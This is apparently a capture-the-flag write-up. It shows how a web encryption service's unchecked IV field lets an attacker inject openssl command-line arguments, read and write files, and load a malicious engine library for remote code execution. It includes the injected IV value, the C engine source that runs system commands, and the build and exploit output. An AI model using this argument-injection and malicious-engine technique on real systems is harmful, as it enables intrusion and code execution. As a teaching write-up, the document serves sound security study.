## Overview 

The challenge is a web service that could encrypt and decrypt arbitary data with an arbitrary key.

![interface](interface.png)

We could try to provide an invalid parameters (for example bad key or iv length) in order to get the backend error. The error looks like this:

```
bad decrypt
140489628592896:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:evp_enc.c:531:
```

We can google this error and recognize the `openssl` library. Let's try to send another invalid parameters to gather more backend errors. The service contains the following checks:

- key length and IV length should be 32
- the mode should be selected from modes in web interface
- during the decryption a ciphertext should be hex-encoded
- the key should contain only hex symbols, **but for IV this check is missed**

Since the IV could contain arbitrary symbols, let's try to pass some symbols. Note that we need to use CBC mode since ECB does not use IV. If we pass a whitespace as an IV symbol (for example `8F0151BC1F8C30E2992DE5DF9CF121 C`) we will get the following error:

```
unknown option 'C'
options are
-in <file>     input file
-out <file>    output file
-pass <arg>    pass phrase source
-e             encrypt
-d             decrypt
-a/-base64     base64 encode/decode, depending on encryption flag
-k             passphrase is the next argument
-kfile         passphrase is the first line of the file argument
-md            the next argument is the md to use to create a key
                 from a passphrase.  One of md2, md5, sha or sha1
-S             salt in hex is the next argument
-K/-iv         key/iv in hex is the next argument
-[pP]          print the iv/key (then exit if -P)
-bufsize <n>   buffer size
-nopad         disable standard block padding
-engine e      use engine e, possibly a hardware device.
Cipher Types
-aes-128-cbc               -aes-128-ccm               -aes-128-cfb              
-aes-128-cfb1              -aes-128-cfb8              -aes-128-ctr              
...
```

It means that the `openssl` have splitted our IV by whitespace and used `C` as another argument. It means that `openssl` is executed in command line and we can control its arguments.

## Solution

Let's look what we could do with command injection.

- we immediately could read and write arbitrary files on the system using `-in <file>` and `-out <file>` parameters, note that the content will be decrypted so we need to pass an encrypted file content
- we could notice the interesting key:

```
-engine e      use engine e, possibly a hardware device.
```

This key is used to provide a custom native engine for `openssl`, the engine is a `.so` library which incapsulates the functions for encryption and decryption. Since we're able to upload files we can upload `.so` file and provide it with the `-engine` parameter.

The example of native engine could be found on the internet. The simplest example is the following:

```c
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
    system("id");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

This code should execute `id` during the encryption process. Let's build it as a library and upload to `/tmp/libsploit.so` using `-out <file>` parameter:

```
gcc -fPIC -shared -lcrypto -o libsploit.so libsploit.c
```

Then provide `-engine /tmp/libsploit.so` parameter for `openssl`:

```
invalid engine "/tmp/libsploit.so"
139644963072768:error:260B606D:engine routines:DYNAMIC_LOAD:init failed:eng_dyn.c:545:
139644963072768:error:2606A074:engine routines:ENGINE_by_id:no such engine:eng_list.c:390:id=/tmp/libsploit.so
139644963072768:error:260B606D:engine routines:DYNAMIC_LOAD:init failed:eng_dyn.c:545:

139644963072768:error:0606506D:digital envelope routines:EVP_DecryptFinal_ex:wrong final block length:evp_enc.c:520:
uid=1000(security) gid=1000(security) groups=1000(security)
uid=1000(security) gid=1000(security) groups=1000(security)
```

This error means that our engine does not export required functions for encryption. But the `bind()` function is called and we got RCE. Let's send `ls -la && cat flag*` to read the flag.

```
